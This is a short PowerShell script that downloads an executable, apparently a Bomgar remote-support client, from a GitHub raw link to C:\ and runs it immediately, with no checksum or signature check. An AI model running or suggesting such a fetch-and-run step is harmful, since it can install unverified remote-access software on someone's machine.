$url = "https://github.com/Reveigh/share/raw/Client/bomgar-scc-w0eec30jixy1hgjw5dx17gedxiy16wf75zfe1fzc40hc90%20(2).exe"
$outputPath = "C:\bomgar-scc-w0eec30jixy1hgjw5dx17gedxiy16wf75zfe1fzc40hc90%20(2).exe"

# Download the executable from the GitHub repository to C:\
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Execute the downloaded executable
Start-Process -FilePath $outputPath